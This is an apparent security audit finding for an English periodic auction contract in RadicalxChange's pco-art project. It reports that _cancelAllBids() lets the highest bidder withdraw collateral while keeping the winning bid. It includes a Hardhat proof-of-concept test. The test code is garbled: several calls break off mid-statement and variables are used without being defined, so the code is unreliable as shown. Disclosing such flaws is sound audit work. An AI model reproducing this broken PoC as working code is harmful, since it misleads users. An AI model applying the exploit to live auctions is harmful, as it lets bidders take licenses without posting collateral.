# The highest bidder can cancel his bid, withdraw his collateral and still obtain ownership of the license

## Summary

When cancelling all bids it is not checked whether the bidder is the highest bidder. Therefore, he can make the highest bid, then cancel it, withdraw the collateral and still obtain ownership of the license. 

## Vulnerability Detail

[`EnglishPeriodicAuctionInternal::_cancelAllBids()`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/EnglishPeriodicAuctionInternal.sol#L416) function does not check whether the calling bidder is the highest bidder. As is done in [`EnglishPeriodicAuctionInternal::_cancelBid()`](https://github.com/RadicalxChange/pco-art/blob/4acd6b06840028ba616b6200439ce0d6aa1e6276/contracts/auction/EnglishPeriodicAuctionInternal.sol#L378).

Please paste the Proof of Concept at the end of the `EnglishPeriodicAuction` test so that you can run it using 'yarn run hardhat test' 

```typescript
describe.only('PoC', function () {
    it('Highest bidder cancels his bid and withdraws his collateral, but his bid remains the highest and gain the ownership of the license', async function () {
      // Auction start: Now - 200

      const instance = await getInstance({
        auctionLengthSeconds: 300,
        initialPeriodStartTime: (await time.latest()) - 200,
        licensePeriod: 1000,
      });

      const licenseMock = await ethers.getContractAt(
        'NativeStewardLicenseMock',
        instance.address,
      );

      // Check initial availableCollateral == 0
      expect(await instance.availableCollateral(owner.address)).to.be.equal(
        0,

      const res1 = await instance

      const receipt1 = await res1.wait();

      const newBidder2Balance = await ethers.provider.getBalance(

      // Expect bidder2 balance to increase by collateralAmount2 because he actually cancel the bid
      expect(newBidder2Balance.add(gasFee1).sub(oldBidder2Balance)).to.be.equal(
        collateralAmount2,
      );

      await time.increase(100);
      await instance.connect(bidder2).closeAuction(0);

      await instance
        .connect(bidder1)

      // Bidder1 has his collateral available because he was outbid
      expect(await instance.availableCollateral(bidder1.address)).to.be.equal(
        collateralAmount1,
      );

      // As we can see, Bidder2 who had withdrawn his collateral, still has the highest bid
      const highestBid = await instance['highestBid(uint256,uint256)'](0, 0);

      expect(highestBid.bidder).to.be.equal(bidder2.address);
      expect(highestBid.bidAmount).to.be.equal(bidAmount2);
      expect(highestBid.feeAmount).to.be.equal(feeAmount2);
      expect(highestBid.collateralAmount).to.be.equal(0);

      // Bidder2 is the new Steward
      expect(await licenseMock.ownerOf(0)).to.be.equal(bidder2.address);

    });
  });
```


## Impact

The highest bidder can withdraw his collateral but still obtain ownership of the license
